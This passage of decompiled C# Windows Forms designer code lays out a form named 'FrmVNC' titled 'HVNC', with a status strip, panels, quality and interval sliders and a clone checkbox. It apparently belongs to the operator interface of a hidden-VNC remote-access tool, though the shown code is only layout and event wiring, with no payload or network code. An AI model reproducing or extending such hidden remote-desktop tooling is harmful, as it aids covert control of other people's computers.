		this.panelControl1.TabIndex = 38;
		this.statusStrip1.AllowItemReorder = true;
		this.statusStrip1.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
		this.statusStrip1.Dock = System.Windows.Forms.DockStyle.None;
		this.statusStrip1.GripStyle = System.Windows.Forms.ToolStripGripStyle.Visible;
		this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.LabelStatus });
		this.statusStrip1.Location = new System.Drawing.Point(5, 2);
		this.statusStrip1.Name = "statusStrip1";
		this.statusStrip1.Size = new System.Drawing.Size(65, 22);
		this.statusStrip1.SizingGrip = false;
		this.statusStrip1.TabIndex = 19;
		this.LabelStatus.Name = "LabelStatus";
		this.LabelStatus.Size = new System.Drawing.Size(39, 17);
		this.LabelStatus.Text = "Ready";
		this.panelControl3.Controls.Add(this.statusStrip1);
		this.panelControl3.Controls.Add(this.chkClone);
		this.panelControl3.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panelControl3.Location = new System.Drawing.Point(0, 496);
		this.panelControl3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.panelControl3.Name = "panelControl3";
		this.panelControl3.Size = new System.Drawing.Size(960, 26);
		this.panelControl3.TabIndex = 38;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(960, 522);
		base.Controls.Add(this.xtraTabControl1);
		base.Controls.Add(this.panelControl3);
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FrmVNC.IconOptions.Icon");
		base.IconOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("FrmVNC.IconOptions.SvgImage");
		base.MinimizeBox = false;
		this.MinimumSize = new System.Drawing.Size(962, 556);
		base.Name = "FrmVNC";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "HVNC";
		base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(VNCForm_FormClosing);
		base.Load += new System.EventHandler(VNCForm_Load);
		base.Click += new System.EventHandler(VNCForm_Click);
		base.KeyPress += new System.Windows.Forms.KeyPressEventHandler(VNCForm_KeyPress);
		((System.ComponentModel.ISupportInitialize)this.VNCBox).EndInit();
		((System.ComponentModel.ISupportInitialize)this.chkClone.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.ResizeScroll.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.ResizeScroll).EndInit();
		((System.ComponentModel.ISupportInitialize)this.QualityScroll.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.QualityScroll).EndInit();
		((System.ComponentModel.ISupportInitialize)this.IntervalScroll.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.IntervalScroll).EndInit();
		((System.ComponentModel.ISupportInitialize)this.DuplicateProgess.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).EndInit();
		this.xtraTabControl1.ResumeLayout(false);
		this.xtraTabPage1.ResumeLayout(false);
		this.xtraTabPage1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.panelControl2).EndInit();
		this.panelControl2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.panelControl1).EndInit();
		this.panelControl1.ResumeLayout(false);
		this.panelControl1.PerformLayout();
		this.statusStrip1.ResumeLayout(false);
		this.statusStrip1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.panelControl3).EndInit();
		this.panelControl3.ResumeLayout(false);
		this.panelControl3.PerformLayout();
		base.ResumeLayout(false);
	}
}
